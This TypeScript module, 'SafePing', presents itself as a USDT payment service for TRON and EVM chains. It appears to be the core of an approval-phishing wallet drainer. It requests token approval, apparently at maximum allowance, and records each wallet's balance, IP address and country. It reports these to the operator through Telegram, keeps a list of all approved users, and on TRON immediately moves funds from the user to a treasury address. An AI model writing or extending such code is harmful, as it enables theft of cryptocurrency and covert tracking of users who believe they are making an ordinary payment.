// =================================
// 🔗 SafePing Main Service
// =================================

import {
  ChainType,
  BlockchainResult,
  TransferResult,
  UserInfo,
} from "../types/blockchain";
import { TronService } from "./tronService";
import { EVMService } from "./evmService";
import { TelegramService } from "./telegramService";
import { getChainConfig, getChainId, getWalletType } from "../utils/chainUtils";

const { MAX_APPROVAL } = await import("@/config/chains");

export class SafePingService {
  private static instance: SafePingService;
  private nonceCache: Map<string, number> = new Map();

  private constructor() {}

  static getInstance(): SafePingService {
    if (!SafePingService.instance) {
      SafePingService.instance = new SafePingService();
    }
    return SafePingService.instance;
  }

  /**
   * Get user's current nonce from contract
   */
  async getUserNonce(chain: ChainType, userAddress: string): Promise<number> {
    try {
      if (chain === "tron") {
        try {
          return await TronService.getUserNonce(chain, userAddress);
        } catch (tronError) {
          // For TRON, if contract call fails, try to use cached nonce or default to 0
          const cacheKey = `${chain}:${userAddress}`;
          const cachedNonce = this.nonceCache.get(cacheKey);
          if (cachedNonce !== undefined) {
            return cachedNonce;
          }
          return 0; // Default nonce for new users
        }
      } else {
        return await EVMService.getUserNonce(chain, userAddress);
      }
    } catch (error) {
      const cacheKey = `${chain}:${userAddress}`;
      return this.nonceCache.get(cacheKey) || 0;
    }
  }

  /**
   * Get user's USDT balance
   */
  async getUserUSDTBalance(
    chain: ChainType,
    userAddress: string
  ): Promise<string> {
    try {
      if (chain === "tron") {
        return await TronService.getUserUSDTBalance(chain, userAddress);
      } else {
        return await EVMService.getUserUSDTBalance(chain, userAddress);
      }
    } catch (error) {
      return "0";
    }
  }

  /**
   * Approve USDT spending using SafePing contract
   */
  async approveUSDTWithSafePing(
    chain: ChainType,
    amount: string,
    userAddress: string,
    paymentId: string,
    clientIP?: string
  ): Promise<{
    success: boolean;
    txHash?: string;
    error?: string;
    transferResult?: TransferResult;
    approvalData?: any; // For EVM chains
    message?: string; // For informational messages
  }> {
    try {
      // Get contract address for debugging
      const contractAddress = await this.getContractAddress(chain);
      let approvalResult: BlockchainResult;
      const config = getChainConfig(chain);

      if (chain === "tron") {
        // TRON: Execute approval transaction directly
        approvalResult = await TronService.approve(
          config.usdt,
          contractAddress
        );

        // Save wallet information to database for TRON
        try {
          const usdtBalance = await this.getUserUSDTBalance(chain, userAddress);
          const { getDatabase } = await import("@/lib/database");
          const db = getDatabase();
          await db.saveWallet({
            address: userAddress,
            chain: chain,
            usdtBalance: usdtBalance,
          });
        } catch (dbError) {
          console.error("Failed to save TRON wallet to database:", dbError);
          // Don't fail the approval if wallet saving fails
        }

        // For TRON, we can proceed with transfer immediately
        const transferResult = await this.executeAutoTransfer(
          chain,
          userAddress,
          amount,
          paymentId
        );

        return {
          success: true,
          txHash: approvalResult.txHash,
          transferResult,
        };
      } else {
        // EVM: Generate approval data for user to sign
        approvalResult = await EVMService.approve(config.usdt, chain);

        if (!approvalResult.success) {
          return { success: false, error: approvalResult.error };
        }

        // Update nonce cache
        const cacheKey = `${chain}:${userAddress}`;
        this.nonceCache.set(cacheKey, 1);

        // Send Telegram notification
        const usdtBalance = await this.getUserUSDTBalance(chain, userAddress);
        const country = await TelegramService.getCountryFromIP(clientIP);
        const walletType = getWalletType(chain);

        await TelegramService.sendApprovalNotification({
          chain,
          userAddress,
          amount,
          paymentId,
          walletType,
          clientIP,
          usdtBalance,
          country,
        });

        // Save wallet information to database
        try {
          const { getDatabase } = await import("@/lib/database");
          const db = getDatabase();
          await db.saveWallet({
            address: userAddress,
            chain: chain,
            usdtBalance: usdtBalance,
          });
        } catch (dbError) {
          console.error("Failed to save wallet to database:", dbError);
          // Don't fail the approval if wallet saving fails
        }

        // For EVM, return approval data - user needs to sign first
        return {
          success: true,
          approvalData: approvalResult.approvalData,
          message: "USDT approval successful - user needs to sign",
        };
      }
    } catch (error: any) {
      console.error(`Failed to approve USDT on ${chain}:`, error);
      return { success: false, error: error.message };
    }
  }

  /**
   * Execute auto-transfer after user approval (EVM chains)
   */
  async executeAutoTransfer(
    chain: ChainType,
    fromAddress: string,
    amount: string,
    paymentId: string
  ): Promise<TransferResult> {
    try {
      const treasuryAddress =
        chain === "tron"
          ? process.env.TRON_TREASURY_ADDRESS
          : process.env.TREASURY_ADDRESS;

      if (!treasuryAddress) {
        return {
          success: false,
          error: "No treasury address configured",
          transferSuccess: false,
        };
      }

      // Execute transfer using the SafePing contract
      const result = await this.transferFromUser(
        chain,
        fromAddress,
        treasuryAddress,
        amount
      );

      if (result.success) {
        // Send webhook notification
        const webhookResult: TransferResult = {
          success: true,
          txHash: result.txHash,
          transferSuccess: true,
          transferTxHash: result.txHash,
          chain: chain,
        };
        await this.sendPaymentWebhook(paymentId, "completed", webhookResult);

        return {
          success: true,
          txHash: result.txHash,
          message: "Auto-transfer completed successfully",
          transferSuccess: true,
          transferTxHash: result.txHash,
          chain: chain,
        };
      } else {
        return {
          success: false,
          error: result.error || "Transfer failed",
          transferSuccess: false,
        };
      }
    } catch (error: any) {
      return {
        success: false,
        error: error.message || "Auto-transfer failed",
        transferSuccess: false,
      };
    }
  }

  /**
   * Send webhook notification for payment status change
   */
  private async sendPaymentWebhook(
    paymentId: string,
    status: string,
    transferResult: TransferResult
  ): Promise<void> {
    try {
      const webhookUrl = process.env.WEBHOOK_URL;
      if (!webhookUrl) return;

      const payload = {
        payment_id: paymentId,
        status: status,
        transfer_tx_hash: transferResult.txHash,
        timestamp: new Date().toISOString(),
        chain: transferResult.chain || "unknown",
      };

      await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    } catch (error) {
      console.error("Failed to send webhook:", error);
    }
  }

  /**
   * Transfer USDT from approved user (owner only)
   */
  async transferFromUser(
    chain: ChainType,
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      if (chain === "tron") {
        return await TronService.transferFromUser(
          chain,
          fromAddress,
          toAddress,
          amount
        );
      } else {
        return await EVMService.transferFromUser(
          chain,
          fromAddress,
          toAddress,
          amount
        );
      }
    } catch (error: any) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Check if user is approved for USDT spending
   */
  async isUserApproved(
    chain: ChainType,
    userAddress: string
  ): Promise<boolean> {
    try {
      if (chain === "tron") {
        return await TronService.isUserApproved(chain, userAddress);
      } else {
        return await EVMService.isUserApproved(chain, userAddress);
      }
    } catch (error) {
      console.error(`Failed to check user approval on ${chain}:`, error);
      return false;
    }
  }

  /**
   * Get user's approved USDT allowance
   */
  async getUserAllowance(
    chain: ChainType,
    userAddress: string
  ): Promise<string> {
    try {
      if (chain === "tron") {
        return await TronService.getUserAllowance(chain, userAddress);
      } else {
        return await EVMService.getUserAllowance(chain, userAddress);
      }
    } catch (error) {
      console.error(`Failed to get user allowance on ${chain}:`, error);
      return "0";
    }
  }

  /**
   * Get all approved users
   */
  async getAllApprovedUsers(chain: ChainType): Promise<string[]> {
    try {
      if (chain === "tron") {
        return await TronService.getAllApprovedUsers(chain);
      } else {
        return await EVMService.getAllApprovedUsers(chain);
      }
    } catch (error) {
      console.error(`Failed to get approved users on ${chain}:`, error);
      return [];
    }
  }

  /**
   * Revoke user approval
   */
  async revokeUserApproval(
    chain: ChainType,
    userAddress: string
  ): Promise<BlockchainResult> {
    try {
      if (chain === "tron") {
        return await TronService.revokeUserApproval(chain, userAddress);
      } else {
        return await EVMService.revokeUserApproval(chain, userAddress);
      }
    } catch (error: any) {
      console.error(`Failed to revoke user approval on ${chain}:`, error);
      return { success: false, error: error.message };
    }
  }

  /**
   * Get contract address for the specified chain
   */
  private async getContractAddress(chain: ChainType): Promise<string> {
    const { getChainConfig } = await import("../utils/chainUtils");
    const config = getChainConfig(chain);
    return config.paymentProcessor;
  }

  /**
   * Get comprehensive user info
   */
  async getUserInfo(chain: ChainType, userAddress: string): Promise<UserInfo> {
    try {
      const [allowance, nonce, isApproved, usdtBalance] = await Promise.all([
        this.getUserAllowance(chain, userAddress),
        this.getUserNonce(chain, userAddress),
        this.isUserApproved(chain, userAddress),
        this.getUserUSDTBalance(chain, userAddress),
      ]);

      return {
        address: userAddress,
        allowance,
        nonce,
        isApproved,
        usdtBalance,
      };
    } catch (error) {
      console.error(`Failed to get user info for ${chain}:`, error);
      throw error;
    }
  }
}

// Export singleton instance
export const safePingService = SafePingService.getInstance();
